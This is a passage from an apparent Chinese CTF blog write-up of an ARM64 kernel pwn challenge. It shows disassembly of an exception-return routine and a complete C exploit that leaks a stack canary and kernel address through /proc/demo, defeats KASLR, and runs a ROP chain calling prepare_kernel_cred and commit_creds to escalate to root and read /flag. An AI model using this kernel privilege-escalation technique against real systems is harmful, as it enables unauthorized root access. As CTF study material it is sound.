SIZE <span class="number">00000050</span> BYTES</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC C1 BF <span class="number">00</span> D0 <span class="number">21</span> A0 <span class="number">00</span> <span class="number">91</span>       ADRL            X1, unk_180B028</span><br><span class="line">.text:<span class="number">0000000000012004</span> <span class="number">80</span> D0 <span class="number">38</span> D5                   MRS             X0, #<span class="number">0</span>, c13, c0, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">0000000000012008</span> <span class="number">21</span> <span class="number">68</span> <span class="number">60</span> F8                   LDR             X1, [X1,X0]</span><br><span class="line">.text:<span class="number">000000000001200</span>C C1 <span class="number">00</span> <span class="number">00</span> B4                   CBZ             X1, loc_12024</span><br><span class="line">.text:<span class="number">000000000001200</span>C</span><br><span class="line">.text:<span class="number">0000000000012010</span> <span class="number">81</span> <span class="number">03</span> <span class="number">40</span> F9                   LDR             X1, [X28]</span><br><span class="line">.text:<span class="number">0000000000012014</span> <span class="number">81</span> <span class="number">00</span> C8 <span class="number">37</span>                   TBNZ            W1, #<span class="number">0x19</span>, loc_12024</span><br><span class="line">.text:<span class="number">0000000000012014</span></span><br><span class="line">.text:<span class="number">0000000000012018</span> E0 <span class="number">3F</span> <span class="number">01</span> <span class="number">32</span>                   MOV             W0, #<span class="number">0x80007FFF</span></span><br><span class="line">.text:<span class="number">000000000001201</span>C <span class="number">01</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W1, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000012020</span> <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">0000000000012020</span></span><br><span class="line">.text:<span class="number">0000000000012020</span>                               ; End of function sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000012020</span></span><br><span class="line">.text:<span class="number">0000000000012024</span>                               ; START OF FUNCTION CHUNK FOR sub_157D0</span><br><span class="line">.text:<span class="number">0000000000012024</span>                               ;   ADDITIONAL PARENT FUNCTION sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000012024</span></span><br><span class="line">.text:<span class="number">0000000000012024</span>                               loc_12024                               ; CODE XREF: sub_157D0<span class="number">-37</span>D8↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span>                                                                       ; sub_11FFC+<span class="number">10</span>↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span>                                                                       ; sub_11FFC+<span class="number">18</span>↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span> <span class="number">35</span> <span class="number">40</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c0, #<span class="number">1</span>, X21 <span class="comment">/* msr	elr_el1, x21 */</span></span><br><span class="line">.text:<span class="number">0000000000012028</span> <span class="number">16</span> <span class="number">40</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c0, #<span class="number">0</span>, X22 <span class="comment">/* msr	spsr_el1, x22 */</span></span><br><span class="line">.text:<span class="number">000000000001202</span>C E0 <span class="number">07</span> <span class="number">40</span> A9                   LDP             X0, X1, [SP,#arg_0]</span><br><span class="line">.text:<span class="number">0000000000012030</span> E2 <span class="number">0F</span> <span class="number">41</span> A9                   LDP             X2, X3, [SP,#arg_10]</span><br><span class="line">.text:<span class="number">0000000000012034</span> E4 <span class="number">17</span> <span class="number">42</span> A9                   LDP             X4, X5, [SP,#arg_20]</span><br><span class="line">.text:<span class="number">0000000000012038</span> E6 <span class="number">1F</span> <span class="number">43</span> A9                   LDP             X6, X7, [SP,#arg_30]</span><br><span class="line">.text:<span class="number">000000000001203</span>C E8 <span class="number">27</span> <span class="number">44</span> A9                   LDP             X8, X9, [SP,#arg_40]</span><br><span class="line">.text:<span class="number">0000000000012040</span> EA <span class="number">2F</span> <span class="number">45</span> A9                   LDP             X10, X11, [SP,#arg_50]</span><br><span class="line">.text:<span class="number">0000000000012044</span> EC <span class="number">37</span> <span class="number">46</span> A9                   LDP             X12, X13, [SP,#arg_60]</span><br><span class="line">.text:<span class="number">0000000000012048</span> EE <span class="number">3F</span> <span class="number">47</span> A9                   LDP             X14, X15, [SP,#arg_70]</span><br><span class="line">.text:<span class="number">000000000001204</span>C F0 <span class="number">47</span> <span class="number">48</span> A9                   LDP             X16, X17, [SP,#arg_80]</span><br><span class="line">.text:<span class="number">0000000000012050</span> F2 <span class="number">4F</span> <span class="number">49</span> A9                   LDP             X18, X19, [SP,#arg_90]</span><br><span class="line">.text:<span class="number">0000000000012054</span> F4 <span class="number">57</span> <span class="number">4</span>A A9                   LDP             X20, X21, [SP,#arg_A0]</span><br><span class="line">.text:<span class="number">0000000000012058</span> F6 <span class="number">5F</span> <span class="number">4B</span> A9                   LDP             X22, X23, [SP,#arg_B0]</span><br><span class="line">.text:<span class="number">000000000001205</span>C F8 <span class="number">67</span> <span class="number">4</span>C A9                   LDP             X24, X25, [SP,#arg_C0]</span><br><span class="line">.text:<span class="number">0000000000012060</span> FA <span class="number">6F</span> <span class="number">4</span>D A9                   LDP             X26, X27, [SP,#arg_D0]</span><br><span class="line">.text:<span class="number">0000000000012064</span> FC <span class="number">77</span> <span class="number">4</span>E A9                   LDP             X28, X29, [SP,#arg_E0]</span><br><span class="line">.text:<span class="number">0000000000012068</span> FE <span class="number">7B</span> <span class="number">40</span> F9                   LDR             X30, [SP,#arg_F0]</span><br><span class="line">.text:<span class="number">000000000001206</span>C FF <span class="number">43</span> <span class="number">05</span> <span class="number">91</span>                   ADD             SP, SP, #<span class="number">0x150</span></span><br><span class="line">.text:<span class="number">0000000000012070</span> E0 <span class="number">03</span> <span class="number">9F</span> D6                   ERET</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后需要注意：不能执行 <code>system(&quot;/bin/sh&quot;)</code>，会触发缺页机制 </p>
+<p>完整 exp 如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_sp_v;</span><br><span class="line"><span class="keyword">size_t</span> *user_sp = &amp;user_sp_v;</span><br><span class="line"><span class="keyword">char</span>* tmpbuf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> canary;</span><br><span class="line"><span class="keyword">size_t</span> kernel_addr;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base;</span><br><span class="line"><span class="keyword">size_t</span> offset;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffff8000080a2258</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffff8000080a24f8</span>;</span><br><span class="line"><span class="keyword">size_t</span> gadget1 = <span class="number">0xffff800008011fe4</span>;</span><br><span class="line"><span class="keyword">size_t</span> gadget2 = <span class="number">0xffff800008016950</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x11, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (user_sp));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x12, sp&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;str x12, [x11]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x11, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (user_sp));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;ldr x12, [x11]&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov sp, x12&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, tmpbuf, <span class="number">0x40</span>);</span><br><span class="line">    write(<span class="number">1</span>, tmpbuf, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/demo&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    canary = buf[<span class="number">12</span>];</span><br><span class="line">    kernel_addr = buf[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary: 0x%llx\n&quot;</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_addr: 0x%llx\n&quot;</span>,kernel_addr);</span><br><span class="line"></span><br><span class="line">    offset = kernel_addr - <span class="number">0xffff8000082376f8</span>; </span><br><span class="line">	kernel_base = <span class="number">0xffff800008000000</span> + offset; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = commit_creds + offset;</span><br><span class="line">    prepare_kernel_cred = prepare_kernel_cred + offset;</span><br><span class="line"></span><br><span class="line">    gadget1 = gadget1 + offset;</span><br><span class="line">    gadget2 = gadget2 + offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget1: 0x%lx\n&quot;</span>,gadget1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget2: 0x%lx\n&quot;</span>,gadget2);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">16</span>] = canary;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">18</span>] = gadget2;</span><br><span class="line">    buf[<span class="number">22</span>] = prepare_kernel_cred+<span class="number">4</span>; <span class="comment">// X19</span></span><br><span class="line">    buf[<span class="number">26</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">32</span>] = commit_creds+<span class="number">4</span>;       <span class="comment">// X30</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">36</span>] = gadget2;</span><br><span class="line">    buf[<span class="number">42</span>] = gadget1;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">45</span>] = get_root;</span><br><span class="line">    buf[<span class="number">46</span>] = <span class="number">0x80001000</span>;</span><br><span class="line">    buf[<span class="number">47</span>] = buf;</span><br><span class="line">    </span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<p><strong>小结：</strong></p>
+<p>第一次打 ARM 的内核题目，调试很久找不到 gadget，最后的 gadget 还是抄的别人的</p>
+<p>太菜了，现在找 gadget 还很迷茫，以后有经验了再总结吧</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/ARM/" rel="tag"><i class="fa fa-tag"></i> ARM</a>
+              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/" rel="prev" title="知识图谱实践项目三">
+      <i class="fa fa-chevron-left"></i> 知识图谱实践项目三
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">223</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">135</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">2.9m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">44:31</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
